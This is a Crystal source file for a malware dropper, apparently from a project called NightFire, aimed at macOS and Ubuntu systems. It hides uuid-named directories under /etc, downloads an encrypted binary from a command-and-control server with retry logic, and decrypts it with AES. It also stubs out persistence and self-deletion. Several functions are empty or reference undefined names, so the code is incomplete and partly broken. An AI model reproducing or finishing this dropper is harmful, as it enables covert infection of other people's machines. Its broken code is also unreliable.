require "http/client"
require "io/memory"
require "file_utils"
require "secure_random"
require "openssl"

# Dropper supports macOS and Ubuntu-based Linux targets.
# We assume this will be run with root privilages to simplify things.
# Change the PLATFORM and ARCH constants to reflect the target info. PLATFORM = MACOS/UBUNTU, ARCH=32/64/ARM.
PLATFORM = "MACOS"
ARCH = "64"
# This should point to the binary download location.
BINARY_URL = "http://example..com/bin/" + PLATFORM + ARCH 
# /etc is used to maintain compatability with both macOS and Linux. Targeted attacks can use custom infection locations.
INFECTION_ROOT = "/etc"
DIRECTORY_NAME = "." + SecureRandom.uuid()
BINARY_NAME =  "." + SecureRandom.uuid()
ENCRYPTED_BINARY_NAME = "." + SecureRandom.uuid()
# Provide the IV and Keys generated by NightFire.
DECRYPTION_IV = "IFYOUDONTCHANGETHISURGONNAHAVEABADTIME"
DECRYPTION_KEY = "IFYOUDONTCHANGETHISURGONNAHAVEABADTIME"

def generate_binary_directory()
	begin
		FileUtils.cd(INFECTION_ROOT)
		if File.exists?(DIRECTORY_NAME)
			# What a conincidence!
			# We'll just remove it then recreate it.
			FileUtils.rm_r(DIRECTORY_NAME)
			Dir.mkdir(DIRECTORY_NAME, mode = 5101)
		else
			Dir.mkdir(DIRECTORY_NAME, mode = 5101)
		end
	rescue
		# Unable to generate directories, probably do to restricted permissions. 
		# Rather than try to sidestep it, we'll throw in the towel. 
		seppuku()
	end
end

def enter_binary_directory()
	begin
		FileUtils.cd(INFECTION_ROOT)
		FileUtils.cd(DIRECTORY_NAME)
	rescue
		# Unable to enter binary directory. Permissions might have been changed by system or PSP.
		seppuku() 
	end
end

def get_binary()
	enter_infection_root()
	client_attempts = 1
	begin
		HTTP::Client.get(BINARY_URL) do |response|
			while client_attempts <= 3
				case response.status_code
				when 200
					# OK. Fetch binary via GET.
					File.write(BINARY_NAME, response.body_io)
					return true
				when 400
					# Connection might be tampered with (ie. transparent proxy).
					client_attempts += 1
				when 404
					# Either CnC is sunk, or BINARY_URL is misconfigured.
					client_attempts += 1
				when 500
					# Caught server during binary regeneration. 
					sleep(15)
					client_attempts += 1
				when 503
					# CnC is overwhelmed, but reachable. Sleep to prevent self-inflicted DDOS.
					sleep(900)
				else
					# Not an error we care to handle. NightFire doesn't implement any other codes.
					# If the server replies with other codes, it's either fake or the domain is wrong.
					client_attempts += 1
				end
			end
			# Reached max attempts.
			# Current domain is a no-go. Sleep until new one is generated.
			puts("UNIMPLEMENTED: SLEEP UNTIL NEXT DOMAIN GENERATION.")
		end
	rescue
		# Can't reach the server, either we're not connected to the internet or we're blocked.
		#seppuku()
	end
end

def decrypt_binary()
	begin
		enter_binary_directory()
		if File.file?(ENCRYPTED_BINARY_NAME)
			# assign file handle 
		else
			# PSP probably just nuked our encrypted binary. Clean up before we get completely mauled.
			seppuku()
		end
	rescue exception
		puts(exception.message)
	end	
	decipher = OpenSSL::Cipher::Cipher.new(AES-128-CBC)
	decipher.decrypt
	decipher_IV = DECRYPTION_IV
	decipher.key = DECRYPTION_KEY
	decypted_binary = decipher.update(encrypted_binary) + decipher.final
	# write decrypted_binary to disk, then remove encrypted binary.
end

def execute_payload()
	# establish persistance and execute
end

def seppuku()
	# delete dropper
end


def main()
end

main()
